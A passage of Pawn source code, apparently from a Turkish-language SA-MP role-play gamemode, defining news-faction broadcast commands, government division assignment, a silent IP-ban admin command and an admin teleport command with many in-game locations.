				new ip[32];
				GetPlayerIp(giveplayerid,ip,sizeof(ip));
				AddBan(ip);
				Kick(giveplayerid);
				return 1;
			}

		}
		else SendClientMessage(playerid, COLOR_GRAD1, "Geçersiz oyuncu.");
	}
	else SendClientMessage(playerid, COLOR_GRAD1, "Bu komutu kullanma yetkiniz yok!");
	return 1;
}

CMD:air(playerid, params[]) {
	return cmd_haber(playerid, params);
}

CMD:haberbaslat(playerid, params[]) {
    if(PlayerInfo[playerid][pFaction] == 9 || PlayerInfo[playerid][pLeader] == 9) {
		if(PlayerInfo[playerid][pRank] >= 4) {
		    if(shutdown == 1) {
				shutdown = 0;
				SendClientMessage(playerid, COLOR_WHITE, "Haber sunumu istasyonu baþladý.");
			} else SendClientMessage(playerid, COLOR_GREY, "Haber sunumu istasyonu zaten baþladý.");
		}
	}
	return 1;
}

CMD:haberbitir(playerid, params[]) {
    if(PlayerInfo[playerid][pFaction] == 9 || PlayerInfo[playerid][pLeader] == 9) {
		if(PlayerInfo[playerid][pRank] >= 4) {
		    if(shutdown == 0) {
				shutdown = 1;
				SendClientMessage(playerid, COLOR_WHITE, "Haber sunumu istasyonunu kapattýn.");
			}  else SendClientMessage(playerid, COLOR_GREY, "Haber sunumu isyasyonu zaten kapalý.");
		}
	}
	return 1;
}

CMD:haber(playerid, params[])
{
	if(PlayerInfo[playerid][pFaction] == 9 || PlayerInfo[playerid][pLeader] == 9) {
		new string[128];

		if(shutdown == 1)
			return SendClientMessage(playerid, COLOR_WHITE, "Haber sistemi þuanda kapalý.");

		if(AdminDuty[playerid] == 1 && PlayerInfo[playerid][pAdmin] < 4)
			return SendClientMessage(playerid,COLOR_WHITE, "Admin olarak iþbaþýndayken  bu komutu kullanamazsýn.");

		if(isnull(params))
			return SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /haber [text]");

		new newcar = GetPlayerVehicleID(playerid);
		if(IsANewsVeh(newcar))
		{
			if(PlayerInfo[playerid][pRank] < 1)
			{
				SendClientMessage(playerid, COLOR_GRAD2, "En az rütbe 1 olmalýsýn.");
			}
			else
			{
				format(string, sizeof(string), "Haberler %s: %s", GetPlayerNameEx(playerid), params);
				ICNews(COLOR_LIGHTGREEN,string);
			}
		}
		else
		{
			SendClientMessage(playerid, COLOR_GREY, "SAH aracý yada helikopteri içerisinde deðilsin.");
			return 1;
		}
	}
	else
	{
		SendClientMessage(playerid, COLOR_GREY, "Haber spikeri deðilsin!");
	}
	return 1;
}

CMD:yayindanat(playerid, params[])
{
	if(PlayerInfo[playerid][pFaction] == 9 && PlayerInfo[playerid][pRank] >= 4 || PlayerInfo[playerid][pLeader] == 9) {

		new
			giveplayerid,
			newsreporter,
	        string[128];

	    if(sscanf(params, "u", giveplayerid))
			return SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /yayindanat [player]");

		if(!IsPlayerConnected(giveplayerid))
			return SendClientMessage(playerid, COLOR_GRAD1, "Geçersiz oyuncu.");

		foreach(Player, i) {
			if(TalkingLive[i] == giveplayerid) newsreporter = i;
		}

		if(TalkingLive[newsreporter] != INVALID_PLAYER_ID) {
			SendClientMessage(newsreporter, COLOR_LIGHTBLUE, "* Canlý yayn sona erdi.");
			SendClientMessage(TalkingLive[newsreporter], COLOR_LIGHTBLUE, "* Canlý yayn sona erdi.");
			TogglePlayerControllable(newsreporter, 1);
			TogglePlayerControllable(TalkingLive[newsreporter], 1);
			TalkingLive[TalkingLive[newsreporter]] = INVALID_PLAYER_ID;
			TalkingLive[newsreporter] = INVALID_PLAYER_ID;
		}

	    if(PlayerInfo[giveplayerid][pLiveBanned] == 0) {
	        PlayerInfo[giveplayerid][pLiveBanned] = 1;
	        format(string, sizeof(string), "%s, %s adlý oyuncuyu canlý yayýndan banladý.", GetPlayerNameEx(playerid), GetPlayerNameEx(giveplayerid));
	        SendRadioMessage(9, RADIO, string);
			format(string, sizeof(string), "%s adlý oyuncuyu canlý yayýndan banladýn.", GetPlayerNameEx(playerid));
	        SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, string);
	        return 1;
	    }  else  {
	        PlayerInfo[giveplayerid][pLiveBanned] = 0;
	        format(string, sizeof(string), "%s, %s adlý oyuncunun canlý yayýn banýný kaldýrdý.", GetPlayerNameEx(playerid), GetPlayerNameEx(giveplayerid));
	        SendRadioMessage(9, RADIO, string);
			format(string, sizeof(string), "Canlý yayýn banýn %s tarafýndan kaldýrýldý.", GetPlayerNameEx(playerid));
	        SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, string);
	        return 1;
	    }
	}
	return 1;
}

CMD:yayinaal(playerid, params[])
{
	if(AdminDuty[playerid] == 1 && PlayerInfo[playerid][pAdmin] < 4)
		return SendClientMessage(playerid,COLOR_WHITE, "Admin olarak iþbaþýndayken  bu komutu kullanamazsýn.");

	if(PlayerInfo[playerid][pFaction] == 9 || PlayerInfo[playerid][pLeader] == 9) {
	    if(shutdown == 1) return SendClientMessage(playerid, COLOR_WHITE, "Haber sistemi þuanda kapalý." );
		if(TalkingLive[playerid] != INVALID_PLAYER_ID) {
			SendClientMessage(playerid, COLOR_LIGHTBLUE, "* Canlý yayn sona erdi.");
			SendClientMessage(TalkingLive[playerid], COLOR_LIGHTBLUE, "* Canlý yayn sona erdi.");
			TogglePlayerControllable(playerid, 1);
			TogglePlayerControllable(TalkingLive[playerid], 1);
			TalkingLive[TalkingLive[playerid]] = INVALID_PLAYER_ID;
			TalkingLive[playerid] = INVALID_PLAYER_ID;
			return 1;
		}

		new string[128], giveplayerid;
		if(sscanf(params, "u", giveplayerid)) return SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /yayinaal [player]");

		if (IsPlayerConnected(giveplayerid)) {
			if (ProxDetectorS(5.0, playerid, giveplayerid)) {
			    if(PlayerInfo[giveplayerid][pLiveBanned] == 1) return SendClientMessage(playerid, COLOR_GREY, "Bu oyuncu canlý yayýndan banlý.");
				if(PlayerCuffed[giveplayerid] >= 1 || PlayerCuffed[playerid] >= 1) {
					SendClientMessage(playerid, COLOR_GRAD2, "Þuanda bunu yapamazsýn.");
				} else {
					if(giveplayerid == playerid) { SendClientMessage(playerid, COLOR_GREY, "Kendini canlý yayýna çýkaramazsýn."); return 1; }
					format(string, sizeof(string), "* %s adlý kiþiye canlý yayýn teklifi yaptýn.", GetPlayerNameEx(giveplayerid));
					SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
					format(string, sizeof(string), "* %s sana canlý yayýn teklifi yaptý, /kabulet canliyayin yazarak kabul edebilirsin.", GetPlayerNameEx(playerid));
					SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, string);
					LiveOffer[giveplayerid] = playerid;
				}
			} else return SendClientMessage(playerid, COLOR_GREY, "Bu oyuncu yanýnda deðil.");
		} else return SendClientMessage(playerid, COLOR_GREY, "Geçersiz oyuncu.");
	} else SendClientMessage(playerid, COLOR_GREY, "   Haber spikeri deðilsin!");
	return 1;
}

CMD:sahbirim(playerid, params[])
{
	if(PlayerInfo[playerid][pLeader] == 9 || PlayerInfo[playerid][pFaction] == 9)
	{
		new string[128], giveplayerid, division;
		if(sscanf(params, "ud", giveplayerid, division))
		{
			SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /sahbirim [player] [division]");
			SendClientMessage(playerid, COLOR_GRAD2, "Available division names: 0 (None), 1 (Security)");
			return 1;
		}
		if(IsPlayerConnected(giveplayerid))
		{
			if(PlayerInfo[giveplayerid][pFaction] != 9) return 1;
			switch(division)
			{
				case 0:
				{
					PlayerInfo[giveplayerid][pDivision] = 0;
					format(string, sizeof(string), "Þuanki biriminden %s tarafýndan atýldýn.", GetPlayerNameEx(playerid));
					SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, string);
					format(string, sizeof(string), "%s adlý kiþiyi biriminden attýn.", GetPlayerNameEx(giveplayerid));
					SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
				}
				case 1:
				{
					PlayerInfo[giveplayerid][pDivision] = 1;
					format(string, sizeof(string), "% tarafýndan Güvenlik birimine alýndýn.", GetPlayerNameEx(playerid));
					SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, string);
					format(string, sizeof(string), "%s adlý kiþiyi Güvenlik birimine davet ettin.", GetPlayerNameEx(giveplayerid));
					SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
				}
			}
		}
		else return SendClientMessage(playerid, COLOR_GREY, " Bu oyuncu oyuna baðlý deðil." );
	}
	else return SendClientMessage(playerid, COLOR_GREY, " Bu komutu kullanamazsýn." );
	return 1;
}

CMD:sadbirim(playerid, params[])
{
	if(PlayerInfo[playerid][pFaction] == 5 || PlayerInfo[playerid][pLeader] == 5)
	{
		new string[128], giveplayerid, division;
		if(sscanf(params, "ud", giveplayerid, division))
		{
			SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /sadbirim [Oyuncu ID/Ýsim] [division]");
			SendClientMessage(playerid, COLOR_GRAD2, "Available division names: 1 (None), 2 (Executive), 3 (Judicial), 4 (Legislative), 5 (SS)");
			return 1;
		}

		if(PlayerInfo[playerid][pRank] >= 4)
		{
			if(IsPlayerConnected(giveplayerid))
			{
				if(PlayerInfo[playerid][pFaction] == 5)
				{
					if(division == 2)
					{
						PlayerInfo[giveplayerid][pDivision] = 2;
						format(string, sizeof(string), "%s tarafýndan Executive birimine alýndýn.", GetPlayerNameEx(playerid));
						SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, string);
						format(string, sizeof(string), "%s adlý kiþiyi Executive birimine daveet ettin.", GetPlayerNameEx(giveplayerid));
						SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
					}
					else if(division == 3)
					{
						PlayerInfo[giveplayerid][pDivision] = 3;
						format(string, sizeof(string), "%s tarafýndan Judicial birimine alýndýn.", GetPlayerNameEx(playerid));
						SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, string);
						format(string, sizeof(string), "%s adlý kiþiyi Judicial birimine davet ettin.", GetPlayerNameEx(giveplayerid));
						SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
					}
					else if(division == 4)
					{
						PlayerInfo[giveplayerid][pDivision] = 4;
						format(string, sizeof(string), "%s tarafýndan Legislative birimine alýndýn.", GetPlayerNameEx(playerid));
						SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, string);
						format(string, sizeof(string), "%s adlý kiþiyi Legislative birimine davet ettin.", GetPlayerNameEx(giveplayerid));
						SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
					}
					else if(division == 5)
					{
						PlayerInfo[giveplayerid][pDivision] = 5;
						format(string, sizeof(string), "%s tarafýndan Secret Service birimine alýndýn.", GetPlayerNameEx(playerid));
						SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, string);
						format(string, sizeof(string), "%s adlý kiþiyi Secret Service birimine davet ettin.", GetPlayerNameEx(giveplayerid));
						SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
					}
					else if(division == 1)
					{
						PlayerInfo[giveplayerid][pDivision] = 1;
						format(string, sizeof(string), "Bulunduðun birimden %s tarafýndan atýldýn.", GetPlayerNameEx(playerid));
						SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, string);
						format(string, sizeof(string), "%s adlý kiþiyi bulunduðu birimden attýn.", GetPlayerNameEx(giveplayerid));
						SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
					}
				}

			}
		}
		else
		{
			SendClientMessage(playerid, COLOR_GRAD1, "Bu komutu kullanabilmek için yetkin yok - Sadece R4+ kiþiler bu komutu kullanabilir");
		}
	}
	return 1;
}
CMD:sad(playerid, params[]) {
	if(PlayerInfo[playerid][pFaction] == 5 || PlayerInfo[playerid][pLeader] == 5)
	{
		if(AdminDuty[playerid] == 1)
			return SendClientMessage(playerid,COLOR_WHITE, "Admin olarak iþbaþýndayken  bu komutu kullanamazsýn.");

 		if(IsPlayerInRangeOfPoint(playerid,5.0,-1221.620849, -155.842590, 4891.833007))
		{
			ShowPlayerDialogEx(playerid, GOVLOCKERMENU, DIALOG_STYLE_LIST, "Devlet Dolaplarý", "Üniforma\nEkipman\nGizli", "Tamam", "Iptal");
		}
		else
		{
			SendClientMessage(playerid, COLOR_WHITE, "Devlet dolaplarýnýn yakýnýnda deðilsin.");
		}
	}
	return 1;
}

CMD:sban(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] >= 2)
	{
		new string[128], giveplayerid, reason[64];
		if(sscanf(params, "us[64]", giveplayerid, reason)) return SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /sban [Oyuncu ID/Ýsim] [sebep]");

		if(IsPlayerConnected(giveplayerid))
		{
			if(PlayerInfo[giveplayerid][pAdmin] > PlayerInfo[playerid][pAdmin])
			{
				if(AdminDuty[playerid] == 1)
				{
					new username[MAX_PLAYER_NAME];
					GetPVarString(playerid, "TempNameName", username, sizeof(username));
					SetPVarInt(playerid, "TempName", 0);
					SetPlayerName(playerid, username);
				}
				format(string, sizeof(string), "AdminKomutu: %s otomatik olarak banlandý, sebep: Kendinden yuksek admini sessiz banlamaya çalýþmak.", PlayerInfo[playerid][pAdminName]);
				ABroadCast(COLOR_YELLOW,string,1);
				PlayerInfo[playerid][pBanned] = 1;
				new ip[32];
				GetPlayerIp(playerid,ip,sizeof(ip));
				AddBan(ip);
				Kick(playerid);
				return 1;
			}
			else
			{
				new playerip[32];
				GetPlayerIp(giveplayerid, playerip, sizeof(playerip));

				if(AdminDuty[giveplayerid] == 1)
				{
					new username[MAX_PLAYER_NAME];
					GetPVarString(giveplayerid, "TempNameName", username, sizeof(username));
					SetPVarInt(giveplayerid, "TempName", 0);
					SetPlayerName(giveplayerid, username);

					format(string, sizeof(string), "AdminKomutu: %s(IP:%s) adlý oyuncu %s tarafýndan sessiz olarak banlandý, sebep: %s", PlayerInfo[giveplayerid][pAdminName], playerip, GetPlayerNameEx(playerid), reason);
					Log("logs/ban.log", string);
					format(string, sizeof(string), "AdminKomutu:: %s adlý oyuncu %s tarafýndan sessiz olarak banlandý, sebep: %s", GetPlayerNameEx(playerid), PlayerInfo[giveplayerid][pAdminName], reason);
				}
				else
				{
					format(string, sizeof(string), "AdminKomutu: %s(IP:%s) adlý oyuncu %s tarafýndan sessiz olarak banlandý, sebep: %s", GetPlayerNameEx(giveplayerid), playerip, GetPlayerNameEx(playerid), reason);
					Log("logs/ban.log", string);
					format(string, sizeof(string), "AdminKomutu:: %s adlý oyuncu bir admin tarafýndan tarafýndan sessiz olarak banlandý, sebep: %s", GetPlayerNameEx(giveplayerid), reason);
				}

				ABroadCast(COLOR_LIGHTRED,string,1);
				PlayerInfo[giveplayerid][pBanned] = 1;
            	new ip[32];
				GetPlayerIp(giveplayerid,ip,sizeof(ip));
				AddBan(ip);
				Kick(giveplayerid);
				return 1;
			}

		}
		else SendClientMessage(playerid, COLOR_GRAD1, "Geçersiz oyuncu.");
	}
	else SendClientMessage(playerid, COLOR_GRAD1, "Bu komutu kullanma yetkiniz yok!");
	return 1;
}

CMD:goto(playerid, params[])
{
    if(PlayerInfo[playerid][pAdmin] >= 2)
	{
		if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
	    {
	        SendClientMessage(playerid,COLOR_WHITE, "Admin olarak görevde deðilsin.");
			return 1;
	    }
		if(isnull(params))
		{
			SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /goto [location]");
			SendClientMessage(playerid, COLOR_GRAD1, "Locations 1: LS, SF, LV, stadium1, stadium2, stadium3, stadium4");
			SendClientMessage(playerid, COLOR_GRAD2, "Locations 2: int1, mall, bank, allsaints, countygen, gym, fbi, rc");
			SendClientMessage(playerid, COLOR_GRAD3, "Locations 3: prison, mark, trucker, custom");
			return 1;
		}
		if(strcmp(params,"ls",true) == 0)
		{
			if(GetPlayerState(playerid) == 2)
			{
				new tmpcar = GetPlayerVehicleID(playerid);
				SetVehiclePos(tmpcar, 1529.6,-1691.2,13.3);
				LinkVehicleToInterior(tmpcar, 0);
				SetVehicleVirtualWorld(tmpcar, 0);
				TelePos[playerid][0] = 0.0; TelePos[playerid][1] = 0.0;
				fVehSpeed[playerid] = 0.0;
			}
			else
			{
				SetPlayerPos(playerid, 1529.6,-1691.2,13.3);
			}
			SendClientMessage(playerid, COLOR_WHITE, "Los santos'a teleport oldun.");
			SetPlayerInterior(playerid,0);
			PlayerInfo[playerid][pInt] = 0;
			SetPlayerVirtualWorld(playerid, 0);
			PlayerInfo[playerid][pVW] = 0;
		}

		else if(strcmp(params,"sf",true) == 0)
		{
		 	if(GetPlayerState(playerid) == 2)
			{
				new tmpcar = GetPlayerVehicleID(playerid);
				SetVehiclePos(tmpcar, -1417.0,-295.8,14.1);
				LinkVehicleToInterior(tmpcar, 0);
				SetVehicleVirtualWorld(tmpcar, 0);
				TelePos[playerid][0] = 0.0;TelePos[playerid][1] = 0.0;
				fVehSpeed[playerid] = 0.0;
			}
			else
			{
				SetPlayerPos(playerid, -1417.0,-295.8,14.1);
			}
			SendClientMessage(playerid, COLOR_WHITE, "San Fierro'ya teleport oldun.");
			SetPlayerInterior(playerid,0);
			PlayerInfo[playerid][pInt] = 0;
			SetPlayerVirtualWorld(playerid, 0);
			PlayerInfo[playerid][pVW] = 0;
		}
		else if(strcmp(params,"custom",true) == 0) {
		    new
		        iInterior,
		        Float: fPos[3];

			strdel(params, 0, 6); // remove 'custom' and space after
			sscanf(params, "fffi", fPos[0], fPos[1], fPos[2], iInterior);
			SetPlayerPos(playerid, fPos[0], fPos[1], fPos[2]);
			SetPlayerInterior(playerid, iInterior);
		}
		else if(strcmp(params,"Kamyon Þoförü",true) == 0) {
		 	if(GetPlayerState(playerid) == 2) {
				new tmpcar = GetPlayerVehicleID(playerid);
				SetVehiclePos(tmpcar, 2271.3115, -2662.9541, 13.6690);
				LinkVehicleToInterior(tmpcar, 0);
				SetVehicleVirtualWorld(tmpcar, 0);
				TelePos[playerid][0] = 0.0;TelePos[playerid][1] = 0.0;
				fVehSpeed[playerid] = 0.0;
			}
			else {
				SetPlayerPos(playerid, 2182.3650, -2662.9866, 17.8828);
			}

			SendClientMessage(playerid, COLOR_WHITE, "Kamyoncu mesleðine teleport oldun.");
			SetPlayerInterior(playerid,0);
			PlayerInfo[playerid][pInt] = 0;
			SetPlayerVirtualWorld(playerid, 0);
			PlayerInfo[playerid][pVW] = 0;
		}
		else if(strcmp(params,"lv",true) == 0)
		{
		 	if(GetPlayerState(playerid) == 2)
			{
				new tmpcar = GetPlayerVehicleID(playerid);
				SetVehiclePos(tmpcar, 1699.2, 1435.1, 10.7);
				LinkVehicleToInterior(tmpcar, 0);
				SetVehicleVirtualWorld(tmpcar, 0);
				TelePos[playerid][0] = 0.0;TelePos[playerid][1] = 0.0;
				fVehSpeed[playerid] = 0.0;
			}
			else
			{
				SetPlayerPos(playerid, 1699.2,1435.1, 10.7);
			}
			SendClientMessage(playerid, COLOR_WHITE, "Las Venturas'a teleport oldun.");
			SetPlayerInterior(playerid,0);
			PlayerInfo[playerid][pInt] = 0;
			SetPlayerVirtualWorld(playerid, 0);
			PlayerInfo[playerid][pVW] = 0;
		}
		else if(strcmp(params,"bank",true) == 0)
		{
		 	if(GetPlayerState(playerid) == 2)
			{
				new tmpcar = GetPlayerVehicleID(playerid);
				SetVehiclePos(tmpcar, 1487.91, -1030.60, 23.66);
				LinkVehicleToInterior(tmpcar, 0);
				SetVehicleVirtualWorld(tmpcar, 0);
				TelePos[playerid][0] = 0.0;TelePos[playerid][1] = 0.0;
				fVehSpeed[playerid] = 0.0;
			}
			else
			{
				SetPlayerPos(playerid, 1487.91, -1030.60, 23.66);
			}
			SendClientMessage(playerid, COLOR_WHITE, "Los Santos'a teleport oldun.");
			SetPlayerInterior(playerid,0);
			PlayerInfo[playerid][pInt] = 0;
			SetPlayerVirtualWorld(playerid, 0);
			PlayerInfo[playerid][pVW] = 0;
		}
		else if(strcmp(params,"allsaints",true) == 0)
		{
		 	if(GetPlayerState(playerid) == 2)
			{
				new tmpcar = GetPlayerVehicleID(playerid);
				SetVehiclePos(tmpcar, 1192.78, -1292.68, 13.38);
				LinkVehicleToInterior(tmpcar, 0);
				SetVehicleVirtualWorld(tmpcar, 0);
				TelePos[playerid][0] = 0.0;TelePos[playerid][1] = 0.0;
				fVehSpeed[playerid] = 0.0;
			}
			else
			{
				SetPlayerPos(playerid, 1192.78, -1292.68, 13.38);
			}
			SendClientMessage(playerid, COLOR_WHITE, "All Saints hastanesine teleport oldun.");
			SetPlayerInterior(playerid,0);
			PlayerInfo[playerid][pInt] = 0;
			SetPlayerVirtualWorld(playerid, 0);
			PlayerInfo[playerid][pVW] = 0;
		}
		else if(strcmp(params,"countygen",true) == 0)
		{
		 	if(GetPlayerState(playerid) == 2)
			{
				new tmpcar = GetPlayerVehicleID(playerid);
				SetVehiclePos(tmpcar, 2000.05, -1409.36, 16.99);
				LinkVehicleToInterior(tmpcar, 0);
				SetVehicleVirtualWorld(tmpcar, 0);
				TelePos[playerid][0] = 0.0;TelePos[playerid][1] = 0.0;
				fVehSpeed[playerid] = 0.0;
			}
			else
			{
				SetPlayerPos(playerid, 2000.05, -1409.36, 16.99);
			}
			SendClientMessage(playerid, COLOR_WHITE, "County General hastanesine teleport oldun.");
			SetPlayerInterior(playerid,0);
			PlayerInfo[playerid][pInt] = 0;
			SetPlayerVirtualWorld(playerid, 0);
			PlayerInfo[playerid][pVW] = 0;
		}
		else if(strcmp(params,"gym",true) == 0)
		{
		 	if(GetPlayerState(playerid) == 2)
			{
				new tmpcar = GetPlayerVehicleID(playerid);
				SetVehiclePos(tmpcar, 2227.60, -1674.89, 14.62);
				LinkVehicleToInterior(tmpcar, 0);
				SetVehicleVirtualWorld(tmpcar, 0);
				TelePos[playerid][0] = 0.0;TelePos[playerid][1] = 0.0;
				fVehSpeed[playerid] = 0.0;
			}
			else
			{
				SetPlayerPos(playerid, 2227.60, -1674.89, 14.62);
			}
			SendClientMessage(playerid, COLOR_WHITE, "Ganton GYM'e teleport oldun.");
			SetPlayerInterior(playerid,0);
			PlayerInfo[playerid][pInt] = 0;
			SetPlayerVirtualWorld(playerid, 0);
			PlayerInfo[playerid][pVW] = 0;
   		}
		else if(strcmp(params,"fbi",true) == 0)
		{
		 	if(GetPlayerState(playerid) == 2)
			{
				new tmpcar = GetPlayerVehicleID(playerid);
				SetVehiclePos(tmpcar, 344.77,-1526.08,33.28);
				TelePos[playerid][0] = 0.0;TelePos[playerid][1] = 0.0;
				fVehSpeed[playerid] = 0.0;
			}
			else
			{
				SetPlayerPos(playerid, 344.77,-1526.08,33.28);
			}
			SendClientMessage(playerid, COLOR_WHITE, "FBI'a teleport oldun.");
			SetPlayerInterior(playerid,0);
			PlayerInfo[playerid][pInt] = 0;
			SetPlayerVirtualWorld(playerid, 0);
			PlayerInfo[playerid][pVW] = 0;
		}
  		else if(strcmp(params,"rc",true) == 0)
		{
		 	if(GetPlayerState(playerid) == 2)
			{
				new tmpcar = GetPlayerVehicleID(playerid);
				SetVehiclePos(tmpcar, 1253.70, 343.73, 19.41);
				LinkVehicleToInterior(tmpcar, 0);
				SetVehicleVirtualWorld(tmpcar, 0);
				TelePos[playerid][0] = 0.0;TelePos[playerid][1] = 0.0;
				fVehSpeed[playerid] = 0.0;
			}
			else
			{
				SetPlayerPos(playerid, 1253.70, 343.73, 19.41);
			}
			SendClientMessage(playerid, COLOR_WHITE, "Red County'e teleport oldun.");
			SetPlayerInterior(playerid,0);
			PlayerInfo[playerid][pInt] = 0;
			SetPlayerVirtualWorld(playerid, 0);
			PlayerInfo[playerid][pVW] = 0;
   		}
		else if(strcmp(params,"prison",true) == 0)
		{
		 	if(GetPlayerState(playerid) == 2)
			{
				new tmpcar = GetPlayerVehicleID(playerid);
				SetVehiclePos(tmpcar, 112.67, 1917.55, 18.72);
				LinkVehicleToInterior(tmpcar, 0);
				SetVehicleVirtualWorld(tmpcar, 0);
				TelePos[playerid][0] = 0.0;TelePos[playerid][1] = 0.0;
				fVehSpeed[playerid] = 0.0;
			}
			else
			{
				SetPlayerPos(playerid, 112.67, 1917.55, 18.72);
			}
			SendClientMessage(playerid, COLOR_WHITE, "DeMorgan hapishanesine teleport oldun.");
			SetPlayerInterior(playerid,0);
			PlayerInfo[playerid][pInt] = 0;
			SetPlayerVirtualWorld(playerid, 0);
			PlayerInfo[playerid][pVW] = 0;
		}
		else if(strcmp(params,"stadium1",true) == 0)
		{
		 	if(GetPlayerState(playerid) == 2)
			{
				new tmpcar = GetPlayerVehicleID(playerid);
				SetVehiclePos(tmpcar, -1424.93, -664.59, 1059.86);
				LinkVehicleToInterior(tmpcar, 4);
				SetVehicleVirtualWorld(tmpcar, 0);
				TelePos[playerid][0] = 0.0;TelePos[playerid][1] = 0.0;
				fVehSpeed[playerid] = 0.0;
			}
			else
			{
				SetPlayerPos(playerid, -1424.93, -664.59, 1059.86);
			}
			SendClientMessage(playerid, COLOR_WHITE, "Stadium 1'e teleport oldun.");
			SetPlayerInterior(playerid,4);
			PlayerInfo[playerid][pInt] = 4;
			SetPlayerVirtualWorld(playerid, 0);
			PlayerInfo[playerid][pVW] = 0;
		}
		else if(strcmp(params,"stadium2",true) == 0)
		{
		 	if(GetPlayerState(playerid) == 2)
			{
				new tmpcar = GetPlayerVehicleID(playerid);
				SetVehiclePos(tmpcar, -1395.96, -208.20, 1051.28);
				LinkVehicleToInterior(tmpcar, 7);
				SetVehicleVirtualWorld(tmpcar, 0);
				TelePos[playerid][0] = 0.0;TelePos[playerid][1] = 0.0;
				fVehSpeed[playerid] = 0.0;
			}
			else
			{
				SetPlayerPos(playerid, -1395.96, -208.20, 1051.28);
			}
			SendClientMessage(playerid, COLOR_WHITE, "You have teleported to Stadium 2.");
			SetPlayerInterior(playerid,7);
			PlayerInfo[playerid][pInt] = 7;
			SetPlayerVirtualWorld(playerid, 0);
			PlayerInfo[playerid][pVW] = 0;
		}
		else if(strcmp(params,"stadium3",true) == 0)
		{
		 	if(GetPlayerState(playerid) == 2)
			{
				new tmpcar = GetPlayerVehicleID(playerid);
				SetVehiclePos(tmpcar, -1410.72, 1591.16, 1052.53);
				LinkVehicleToInterior(tmpcar, 14);
				SetVehicleVirtualWorld(tmpcar, 0);
				TelePos[playerid][0] = 0.0;TelePos[playerid][1] = 0.0;
				fVehSpeed[playerid] = 0.0;
			}
			else
			{
				SetPlayerPos(playerid, -1410.72, 1591.16, 1052.53);
			}
			SendClientMessage(playerid, COLOR_WHITE, "You have teleported to Stadium 3.");
			SetPlayerInterior(playerid,14);
			PlayerInfo[playerid][pInt] = 14;
			SetPlayerVirtualWorld(playerid, 0);
			PlayerInfo[playerid][pVW] = 0;
		}
		else if(strcmp(params,"stadium4",true) == 0)
		{
		 	if(GetPlayerState(playerid) == 2)
			{
				new tmpcar = GetPlayerVehicleID(playerid);
				SetVehiclePos(tmpcar, -1394.20, 987.62, 1023.96);
				LinkVehicleToInterior(tmpcar, 15);
				SetVehicleVirtualWorld(tmpcar, 0);
				TelePos[playerid][0] = 0.0;TelePos[playerid][1] = 0.0;
				fVehSpeed[playerid] = 0.0;
    		}
			else
			{
				SetPlayerPos(playerid, -1394.20, 987.62, 1023.96);
			}
			SendClientMessage(playerid, COLOR_WHITE, "You have teleported to Stadium 4.");
			SetPlayerInterior(playerid,15);
			PlayerInfo[playerid][pInt] = 15;
			SetPlayerVirtualWorld(playerid, 0);
			PlayerInfo[playerid][pVW] = 0;
		}
		else if(strcmp(params,"int1",true) == 0)
		{
		 	if(GetPlayerState(playerid) == 2)
			{
				new tmpcar = GetPlayerVehicleID(playerid);
				SetVehiclePos(tmpcar, 1416.107000,0.268620,1000.926000);
				LinkVehicleToInterior(tmpcar, 1);
				SetVehicleVirtualWorld(tmpcar, 0);
				TelePos[playerid][0] = 0.0;TelePos[playerid][1] = 0.0;
				fVehSpeed[playerid] = 0.0;
			}
			else
			{
				SetPlayerPos(playerid, 1416.107000,0.268620,1000.926000);
			}
			SendClientMessage(playerid, COLOR_WHITE, "You have teleported to Interior 1.");
			SetPlayerInterior(playerid,1);
			PlayerInfo[playerid][pInt] = 1;
			SetPlayerVirtualWorld(playerid, 0);
			PlayerInfo[playerid][pVW] = 0;
		}
		else if(strcmp(params,"mark",true) == 0)
		{
		 	if(GetPlayerState(playerid) == 2)
			{
				new tmpcar = GetPlayerVehicleID(playerid);
				SetVehiclePos(tmpcar, TeleportDest[playerid][0],TeleportDest[playerid][1],TeleportDest[playerid][2]);
				LinkVehicleToInterior(tmpcar, TeleportDestInt[playerid]);
			}
			else
			{
				SetPlayerPos(playerid, TeleportDest[playerid][0],TeleportDest[playerid][1],TeleportDest[playerid][2]);
			}
			SetPlayerInterior(playerid,TeleportDestInt[playerid]);
			PlayerInfo[playerid][pInt] = TeleportDestInt[playerid];
			SendClientMessage(playerid, COLOR_WHITE, "You have teleported to your marker.");
		}
		else if(strcmp(params,"mark2",true) == 0)
		{
		 	if(GetPlayerState(playerid) == 2)
			{
				new tmpcar = GetPlayerVehicleID(playerid);
				SetVehiclePos(tmpcar, TeleportDest2[playerid][0],TeleportDest2[playerid][1],TeleportDest2[playerid][2]);
				LinkVehicleToInterior(tmpcar, TeleportDestInt2[playerid]);
			}
			else
			{
				SetPlayerPos(playerid, TeleportDest2[playerid][0],TeleportDest2[playerid][1],TeleportDest2[playerid][2]);
			}
			SetPlayerInterior(playerid,TeleportDestInt2[playerid]);
			PlayerInfo[playerid][pInt] = TeleportDestInt2[playerid];
			SendClientMessage(playerid, COLOR_WHITE, "You have teleported to your second marker.");
		}
		else if(strcmp(params,"mall",true) == 0)
		{
		 	if(GetPlayerState(playerid) == 2)
			{
				new tmpcar = GetPlayerVehicleID(playerid);
				SetVehiclePos(tmpcar, 1133.71,-1464.52,15.77);
